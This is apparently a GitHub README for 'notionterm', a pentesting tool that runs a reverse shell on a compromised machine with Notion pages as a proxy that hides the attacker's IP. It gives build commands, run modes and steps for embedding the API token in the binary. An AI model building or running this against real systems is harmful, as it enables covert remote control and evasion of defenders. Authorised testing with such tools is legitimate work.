<div align="center">
<h1>
  <code>notionterm</code> 
</h1>
  <img src="https://github.com/ariary/notionterm/blob/main/img/notionterm.png"  width=150>
  
  <strong> Embed reverse shell in <a href="https://www.notion.so">Notion</a> pages.</strong><br>
  <i>Hack while taking notes</i>

<a href="https://github.com/spencerpauly/awesome-notion"><img src="https://awesome.re/mentioned-badge.svg"></a>

</div>

---

![demo](https://github.com/ariary/notionterm/blob/main/img/demo_dark_light.gif)

---
<div align=left>
<h3>FOR ➕:</h3>
<ul>
  <li>Hiding attacker IP in reverse shell <i>(No direct interaction between attacker and target machine. Notion is used as a proxy hosting the reverse shell)</i></li>
  <li>Demo/Quick proof insertion within report</li>
  <li>High available and shareable reverse shell (desktop, browser, mobile)</li>
  <li>Encrypted and authenticated remote shell</li>
</ul> 
</div>
<div align=left>
<h3>NOT FOR ➖:</h3>
<ul>
  <li>Long and interactive shell session (see <a href=https://github.com/ariary/tacos>tacos</a> for that)</li>
</ul>
</div>

---
<div align=left>
<h3 >Why? 🤔 </h3>
The focus was on making something fun while still being usable, but that's not meant to be THE solution for reverse shell in the pentester's arsenal
</div>
<div align=right>
<h3 >How?  🤷‍♂️</h3>
Just use notion as usual and launch <code>notionterm</code> on target.
</div>
<div align=left>
<h3 >Requirements 🖊️</h3>
 <ul>
  <li>Notion software and API key</li>
  <li>Allowed HTTP communication from the target to the notion domain</li>
  <li>Prior RCE on target</li>
</ul> 
</div>

---
<blockquote align=left>
roughly inspired by the great idea of <a href="https://github.com/mttaggart/OffensiveNotion">OffensiveNotion</a> and <a href="https://github.com/ariary/Notionion">notionion</a>! 
</blockquote>

## Quickstart

### 🏗️ Set-up
1. Create a page and give to the integration API key the permissions to have page write access
2. Build `notionterm` and transfer it on target machine (see [Build](#build))

### 👟 Run

There are 3 main ways to run `notionterm`:

<details>
  <summary><b>"normal" mode</b><br><i>Get terminal, stop/unstop it, etc...</i></summary>
<code>
notionterm [flags]
</code><br>
Start the shell with the button widget: turn <code>ON</code>, do you reverse shell stuff, turn <code>OFF</code> to pause, turn <code>ON</code> to resume etc...
</details>

<details>
  <summary><b>"server" mode</b><br><i>Ease notionterm embedding in any page</i></summary>
<code>
notionterm --server [flags]
</code><br>
Start a shell session in any page by creating an embed block with URL containing the page id <i>(<code>CTRL+L</code>to get it)</i>: <code>https://[TARGET_URL]/notionterm?url=[NOTION_PAGE_ID]</code>.
</details>


<details>
  <summary><b><code>light</code> mode</b><br><i>Only perform HTTP traffic from target → notion</i></summary>
<code>
notionterm light [flags]
</code>
</details>

## Build

As `notionterm` is aimed to be run on target machine it must be built to fit with it.

Thus set env var to fit with the target requirement:
```shell
GOOS=[windows/linux/darwin]
```

### Simple build
```shell
git clone https://github.com/ariary/notionterm.git && cd notionterm
GOOS=$GOOS go build notionterm.go
```

You will need to set API key and notion page URL using either env var (`NOTION_TOKEN` & `NOTION_PAGE_URL`) or flags (`--token` & `--page-url`)

### "All-inclusive" build
Embed directly the notion integration API token and notion page url in the binary. *⚠️ everybody with access to the binary can retrieved the token. For security reason don't share it and remove it after use.*

Set according env var:
```shell
export NOTION_PAGE_URL=[NOTION_PAGE_URL]
export NOTION_TOKEN=[INTEGRATION_NOTION_TOKEN]
```
And build it:
```
git clone https://github.com/ariary/notionterm.git && cd notionterm
./static-build.sh $NOTION_PAGE_URL $NOTION_TOKEN $GOOS
```
